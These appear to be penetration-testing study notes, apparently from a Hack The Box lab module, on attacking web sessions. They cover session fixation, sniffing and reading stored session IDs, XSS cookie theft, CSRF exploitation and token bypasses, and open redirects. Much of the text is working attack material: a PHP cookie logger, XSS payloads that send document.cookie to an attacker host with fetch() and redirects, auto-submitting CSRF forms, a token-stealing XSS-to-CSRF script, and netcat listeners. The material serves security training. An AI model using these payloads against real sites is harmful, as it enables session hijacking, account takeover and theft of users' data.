HTTP is a stateless communication protocol and as such, any request-response transaction is unrelated to other transactions. This means that each request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client's side only. For the reason above, web applications utilize cookies, URL parameters, URL arguments (on GET requests), body arguments (on POST requests), and other proprietary solutions for session tracking and management purposes.
- A unique **session identifier** `Session ID` or token is the basis upon which user sessions are generated and distinguished. If an attacker managed to get one, it could result in session hijacking
- It could be `captured through passive traffic / packet sniffing`, `identified in logs`, `predicted` or `brute forced`.



# Session Fixation
This `occurs when session identifiers` (such as cookies) are being accepted from `URL Query Strings` or `Post Data`. The attacker can `create` (fixate) a (valid) session identifier if `this gets reflected in another cookie value` to trick the victim into logging into the web app using the aforementioned session ID. Here is the breakdown of the attack :
- Let's say we come across a URL of the below format :
```bash
http://oredirect.htb.net/?redirect_uri=/complete.html&token=TokenValue123
```
- Looking at the request made, we found a session cookie named `PHPSESSID`, that has the same value `"TokenValue123"` as the `token` parameter's value on the URL. If any value or a valid session identifier specified in the `token` parameter on the URL is propagated to the `PHPSESSID` cookie's value, we are probably dealing with a session fixation vulnerability.
- To verify, we could open a new private window and browse the URL `http://oredirect.htb.net/?redirect_uri=/complete.html&token=IControlThisCookie`, to check if the value that we input in the `token` parameter gets reflected in the request's cookie `PHPSESSID`. If so, then we are dealing with a Session Fixation vulnerability !
- An attacker could then `send a URL similar` to the above to a victim. If the victim logs into the application, the web app will `assign the session ID to the victim`, and the attacker could hijack the session since the `session identifier is already known` (the attacker fixated it, i.e. he created it !).
**Note:** Sometimes authenticating to a web app is `not a requirement` to get a valid session ID. We could create a new account on the web app to get one. For this to work, the assigned sess ID pre-login must remain the same post-login.



# Obtaining SessID w/out User Interaction 
## W/ Traffic Sniffing
Requires : 
- The attacker must be positioned on the same local network as the victim
- Unencrypted HTTP traffic
```bash
# Network monitoring using Wireshark
sudo -E wireshark
```
- We could apply filters in `Wireshark` to only get `HTTP` traffic
- To `search for a string` inside Wireshark packets, we could navigate to `Edit` -> `Find Packet` -> Left-click on `Packet list` and then click `Packet bytes`. Select `String` on the third drop-down menu and specify `auth-session` (or the string we want to search) & click `find`. Here, by specifying `auth-session`, we're looking for a session ID inside wireshark packets capture
- If we found a cookie or any other session ID inside Wireshark packets capture, we could use it to authenticate against the web app as another user !
## W/ Web Server Access
During the post-exploitation phase, `session identifiers` and `session data` can be retrieved from either a web server's disk or memory. A victim `has to be autheticated` for us to view their session IDs.
```bash
# Find where PHP session IDs are stored. Usually in /var/lib/php/sessions
locate php.ini
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
# The name of a session ID will be sess_VALUE
cat /var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```
- To find where `JAVA` stores its `session IDs`, we could refer to the [Apache Software Foundation](https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html) :
	1. "The `Manager` element represents the _session manager_ that is used to create and maintain HTTP sessions of a web application. Tomcat provides two standard implementations of `Manager`. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate `Store` nested element. The filename of the default session data file is `SESSIONS.ser`."
- In `.NET`, session data can be found in : 
	1. The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
	2. StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
	3. An SQL Server
More info in [Introduction To ASP.NET Sessions](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)
## W/ Database Access
If we have access to a dabase, we could check for stored user sessions
```sql
show databases;
use project;
show tables;
select * from users;

select * from all_sessions;
```



# Obtaining SessID w/ User Interaction
## XSS
We can use `XSS vuln` to grab a valid `session ID` like `cookies`. For this to work, we need : 
- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)
More info in [[Cross-Site Scripting (XSS)]] 
Suppose we get access to a web app where we have an account, and we try to update some fields of our account. We could try those payloads :
```javascript
"><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=confirm(1)>
"><img src=x onerror=alert(1)>
```
If they're blocked, you'll have to use something else like `onmouseover`. 
- If the payload didn't get executed, we could try to `call / execute` it w/ another functionality, like a `share` function or whatever
- When we found a valid payload, we could verify if the `HTTPOnly` flag is `off` using `Web Developper Tools` in `cookies` section
- If `HTTPOnly` is off, then we could `obtain session cookies through XSS` : 
	1. Create a cookie-logging script (`log.php`) that waits for anyone to request `?c=+document.cookie`, and will parse the included cookie.  
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```
2. We could then run the script 
```bash
# Run a php server that would host the script
php -S TUN_IP:8000
```
3. Use the following payload to trigger our `php` script and grab the cookie
```bash
# Javascript payload that would look for a log.php file on a remote server
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```
**Note**: If testing in real world, try using something like [XSSHunter](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS. 
4. Now, if a `victim navigates` to our public `infected` profile, the payload will be triggered, and we should `receive the cookie` through our `PHP server` to hijack the victim's session !
### Netcat
We could also perform the same attack using the `Netcat` tool instead : we could use `payloads that do not redirect the victim` to another server, and fetch data directly : 
```bash
# Javascript payload for evasion purposes. Directly fetch the cookies
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>

# Javascript payload that use fetch() to grab data (i.e. cookies) and send it to our server w/out redirection
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```
Next, we run a netcat listener, and just wait for the `victim to visit our public profile hosting a cookie-stealing payload` (leveraging the stored XSS vulnerability we previously identified) !
```bash
nc -lvnp 8000
```
**Note:** The cookie value might be `base64 encoded` if we're using the `btoa()` function of the `second Javascript payload for evasion`. We can decode it using `atob("b64_string")` in the Dev Console of Web Developer Tools
- Once the clear text value of the cookie has been retrieved, we could use it to hijack the victim's session !



## CSRF
This attack forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. It is usually mounted w/ a `malicious crafted web page` that the victim must `visit` or `interact w/`. A web application is vulnerable to CSRF attacks when :
- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
To successfully exploit a CSRF vulnerability, we need :
- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued
Here is a CSRF example : 
- Let's say we're `trying to update` a profile in a web app. Looking at the update request we don't find any `anti-CSRF` token. We could use a `malicious HTML` page `"notmalicious.html"` that would `imitate the update request` made by the web app
```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
To help make the `HTML` page, we could copy the `source code` of the web app
![image](https://academy.hackthebox.com/storage/modules/153/29.png)
- Once made, we could serve the page 
```bash
python -m http.server 1337
```
- Now, we could send our malicious URL `http://<VPN/TUN Adapter IP>:1337/notmalicious.html` to update his profile information. We could use `XSS` to do that
### CSRF GET-based
If we found a `CSRF` included in a `GET` request (URL), we could hijack the victim's session or try to deface the web app. Here we'll work again w/ a profile of an account on a web app. 
- To `deface` the profile, we could `create and host` the below `HTML` page as `notmalicious_get.html`, and start a listener to serve it 
```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
Here, we'll put the `same CSRF token value` as the one we `found` previously. We can use following resource [Sending form data](https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending_and_retrieving_form_data) to study how to get the above form based on the intercepted GET request.
- If we visit the below URL `http://TUNAdapterIP:1337/notmalicious_get.html` while still being connected as our profile, we'll notice that the profile details will change to the ones we specified in the `HTML` page ! 
### CSRF POST-based
Most of the time `CSRF` will reside in `POST` data. Here we'll try to leak a `CSRF` token. 
- Let's take an example where on a profile page, we can `delete` our account. We'll try to steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability. 
![image](https://academy.hackthebox.com/storage/modules/153/36.png)
- We notice that when clicking on the `Delete` button, the email gets reflected on the page. We could input the following `HTML` value into the `email` value, right after the `/app/delete/HTML_VALUE`
```html
<h1>h1<u>underline<%2fu><%2fh1>
```
- We'll see that our `HTML` code now replace the previous `email` value. When inspecting the `source code`, we'll notice that our injection happens before a `single quote` (cf image).
![image](https://academy.hackthebox.com/storage/modules/153/39.png)
- We can `start a netcat listener`, and use the following payload to get the `CSRF` token of the victim
```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```
- We'll just need to send the payload to the `URL` and make the victim visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f` to retrieve the `CSRF` token in our `netcat listener`
### XSS & CSRF Chaining
Sometimes, even if we manage to bypass CSRF protections, we may not be able to create cross-site requests due to some sort of same origin/same site restriction (=`anti-CSRF` measure). Let's say we already have found a `stored XSS` vulnerability in a field on a web app. We could still perform a `CSRF` attack by leveraging the `XSS` to issue a state-changing request against the web application. A request through XSS will bypass any same origin/same site protection since it will derive from the same domain !
- We'll work here in the `Country` field of the web app w/ our `XSS` payload, and we'll be targeting the `Change Visibility` option since this could cause the disclosure of a private profile. 
- Before creating a payload, we should `study the request made` when we're using the `Change Visibility` option. 
![image](https://academy.hackthebox.com/storage/modules/153/56.png)
- Here is the `payload` that we should specify in the `XSS vulnerable field` to execute a `CSRF` attack that will change the victim's visibility settings (from private to public & vice versa), `BASED ON THE "CHANGE VISIBILITY" OPTION'S REQUEST` :
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```
- Let's break down the payload :
```bash
- The payload is put inside <script> tags to gets executed, otherwise it would be consider as text !

- The "req.onload =" event handler will perform an action once the page has been loaded. This action will be related to the "handleResponse" function that we will define later

- The "req.open()" is passing three arguments : "get" which is the method used, the targeted path "/app/change-visibility" and then "true" which will continue the execution

- The "req.send" will send everything in the HTTP request

- We define a "handleResponse" function : 
- The "var token =" variable will get the value of "responseText" from the page we specified earlier in our request
- "/name="csrf" type="hidden" value="(\w+)"/)[1];" will look for a hidden input field called "csrf"
- The last 4 lines will constructs the HTTP request that we will send through a "XMLHttpRequest" object
- The "changeReq.open" will change the request method from GET to POST. First request was to move us to the targeted page, and this one to perform the wanted action of changing a victim profile visibility
- The "changeReq.setRequestHeader" is setting the Content-Type of the request
- The "changeReq.send" sends the request w/ one param "csrf". Be careful to find the good name of the param ! These are the 2 parameters we found while inspecting the targeted request w/ Burp.
```
**Note:** In some cases, the `name of the hidden value` might be different. To check if it's actually `"CSRF"`, we can search for the `"CSRF"` string in the `Web Developer Tools`. 
**Note 2**: If no result is returned and you are certain that CSRF tokens are in place, look through various bits of the source code or copy your current CSRF token and look for it through the search functionality. This way, you may uncover the input field name you are looking for.
- Once done, we could input the following payload in the `vulnerable XSS field`. Once a victim will browse our profile (containing the payload !), after a refresh his profile will become public !
### Exploiting Weak CSRF Token
Sometimes `CSRF token generation algorithms` are not very secure. Web app can generate tokens using `md5(username)`, `sha1(username)`, `md5(current date + username)` etc...
- It's always worth to create an account, look into the requests to identify a `CSRF` token w/ his value to see how the generation is made
```bash
# Get the md5 value of the user Paul
echo -n Paul | md5sum
```
If the hash generated w/ `md5 or sha1` is the `same as the one found in the request`, then we could attack other users through `CSRF`
- We could save the below malicious page as `press_start_2_win.html`(which we created based on inspecting the burp's request)
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```
**Note**: This `HTML` code is including a `user-triggered`event handler (onclick) as a `Start!` button, to evade a `Popup Blockers` security measure, preventing HTML code to load unwanted pop-up windows.
- For our malicious page to have `MD5-Hashing` functionality, we can use the below `md5.min.js` script
```javascript
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map
```
- Next we can serve those pages using an HTTP server. Now when visiting the `http://<VPN/TUN Adapter IP>:1337/press_start_2_win.html` page we're serving and `clicking the Start!` button, the victim will have his profile change from private to public !
### Other CSRF Protection Bypasses
- `Null Value` : We can try making the CSRF token a null value (empty), because sometimes the check is only for the header and does not check the value
```bash
CSRF-Token:
```
- `Random CSRF Token` : Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF protection that validates if the token has a value and the length of that value.
```bash
Real:
CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331

Fake:
CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3
```
- `Use Another Session’s CSRF Token` : We could try to use the `same` CSRF token `across accounts`. It may work if the web app is not validating that the CSRF token is tied to a specific account. We could then re-use a token w/ different accounts leading to CSRF attacks
- `Request Method Tampering` : We can also try to change the request method, from `POST to GET` and vice versa. Unexpected requests may be served without the need for a CSRF token
```bash
# POST request
POST /change_password
POST body:
new_password=pwned&confirm_new=pwned

# Transformed in GET request
GET /change_password?new_password=pwned&confirm_new=pwned
```
- `Delete the CSRF token parameter or send a blank token` : Not sending a token works fairly often because of the following common application logic mistake. Applications sometimes only check the token's validity if the token exists or if the token parameter is not blank.
```bash
# Real request
POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331

# Try 
POST /change_password
POST body:
new_password=qwerty

# Or
POST /change_password
POST body:
new_password=qwerty&csrf_token=
```
- `Session Fixation > CSRF` : Sites could use a `double-submit` cookie as a defense against CSRF. This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If this is the case `and a session fixation vulnerability exists`, an attacker could perform a successful CSRF attack as follows :
```bash
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```
- `Anti-CSRF Protection via the Referrer Header` : If an application is using the referrer header as an anti-CSRF mechanism, you can try removing the referrer header. Add the following meta tag to your page hosting your CSRF script.
```bash
<meta name="referrer" content="no-referrer"`
```
- `Bypass the Regex` : Sometimes the `Referrer` has a whitelist regex or a regex that allows one specific domain. If the Referrer Header is checking for its own domain `target.com`, we could try something like `www.target.com.pwned.m3`, which may bypass the regex. We could try `www.pwned.m3?www.target.com` or `www.pwned.m3/www.target.com` as well.
## Open Redirect
Occurs when an attacker can redirect a victim to an attacker-controlled site by `abusing a legitimate application's redirection functionality`. The attacker just has to specify a website under his control in a redirection URL of a legitimate website and pass this URL to the victim.
- The malicious URL an attacker would send leveraging the `Open Redirect` vulnerability would look as follows: `trusted.site/index.php?url=https://evil.com`
```bash
# URL parameters to check for Open Redirect vuln
- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?go=
- ?goto=
- ?exit=
- ?exitpage=
- ?fromurl=
- ?fromuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=
```
- Often we'll see `redirections` in login pages like : `/login.php?redirect=dashboard`
- Let's say `after completing a form` in a web app, we face the following URL `http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`. We'll try to control the site where the `redirect_uri` parameter points to. 
- We'll first start a netcat listener. 
- Then, we'll `edit the redirection URL` and place a website that we control, like : `http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`
- If a victim visit our above crafted URL, and when the redirection will be made, we should notice a connection to our listener and receive the victim's token !
